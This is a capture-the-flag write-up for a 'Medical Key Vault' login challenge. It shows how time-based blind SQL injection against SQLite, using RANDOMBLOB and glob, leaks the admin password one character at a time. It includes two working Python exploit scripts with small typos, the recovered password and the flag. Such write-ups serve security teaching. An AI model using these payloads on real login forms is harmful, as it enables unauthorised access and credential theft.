# Key Vault -- Solution

## Introduction

If we open the task link, we can see the login form. Also, there is the title of the page **"Medical Key Vault Login"**, and we can see the background image with **injection**. This is a hint for the task - SQL injection.

## Find the underlying database

The solution to this task is to perform a timing blind attack on the database. The most time-consuming part is to find which database is used.

To check if the attack works, we can measure time with the wrong username/password and with injection payload.

For SQLite, we can use the `RANDOMBLOB` function to perform a blind time attack:

```
import requests
import time


def measure_time(url, data, n):

    total = 0
    for _ in range(n):
        start = time.time()
        requests.post(url, data=data)
        end = time.time()
        diff = (end - start)
        total += diff

    return total / n


def main():
    url = 'https://tbtl-key-vault.chals.io/login'

    original = {'username': 'admin,' 'password': 'password'}
    attack = {'username': 'admin', 'password': f'" OR RANDOMBLOB(300000000); --'}

    for _ in range(5):
        time_org = measure_time(url, original, 3)
        time_attack = measure_time(url, attack, 3)
        print("Original/Attack time:", time_org, time_attack)


if __name__ == '__main__':
    main()
```
We can spot that if we use a malicious payload, the query time is statistically bigger than the ordinary payload.

## Robust script

We need robust methods to perform attacks because of network and other uncontrollable parameters. The idea is to trigger a time attack when we guess one letter of the password. The username is **admin** (this can be concluded from the website text).

Here is a complete script that can export **password**:

```
import requests
import time
import string

url = 'https://tbtl-key-vault.chals.io/login'

current = ''

while True:

    times = []
    for i in string.ascii_letters + string.digits:
        data = {'username': 'admin', 'password': f'" OR (password glob "{current}{i}*" AND RANDOMBLOB(300000000)); --'}
        start = time.time()
        r = requests.post(URL, data=data)
        end = time.time()

        diff = (end - start)

        times.append((diff, i))

        print(i, diff)

    times.sort(reverse=True)

    letter = ''
    time_value = 0
    for i in times[:5]:
        data = {'username': 'admin', 'password': f'" OR (password glob "{current}{i[1]}*" AND RANDOMBLOB(300000000)); --'}
        start = time.time()
        for _ in range(3):
            r = requests.post(URL, data=data)
        end = time.time()
        diff = (end - start) / 3
        print(i, diff)
        if diff > time_value:
            time_value = diff
            letter = i[1]

    print(times[:5])
    current += letter
    print(current)
print()
```

Exported **password** is **oCLE6BL1L9**, and when we login we get the flag: **TBTL{W3_4R3_4LL_BL1ND}**
